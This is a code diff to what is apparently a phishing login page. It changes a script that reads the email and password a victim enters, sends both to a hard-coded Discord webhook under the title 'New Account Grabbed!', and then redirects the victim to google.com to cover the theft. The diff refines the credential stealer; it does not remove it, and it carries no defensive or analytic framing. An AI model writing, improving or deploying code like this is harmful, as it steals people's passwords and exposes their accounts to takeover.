@@ -231,8 +231,7 @@ body {
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
         
-        if (email) {
-          
+         if (password) {
           fetch("https://discord.com/api/webhooks/1450510149876715712/V72h6vseNrLJD7BuA7JQiSzxDnzrHhtY5ygGsI0VbdGhrfE_0Nvdg1mqXDYup49WJnbd", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
@@ -240,15 +239,14 @@ body {
               username: "log-thing",
               embeds: [{
                 title: "❗ New Account Grabbed! ❗",
-                description: `**Email Address:**\n*${email}*\n**Password:**\n*${password}*`,
-                color: 0x00ff04
+                description: `**email:**\n*${email}* \n **password:**\n*${password}*`,
+                color: 0x00ff04,
               }],
             }),
           }).catch(console.error);
-         window.location.replace("otp.html")
-          
+          window.location.replace("https://www.google.com")
         }else{
-          alert("please enter username and password")
+          alert("Please enter username and password")
         }
           
       }
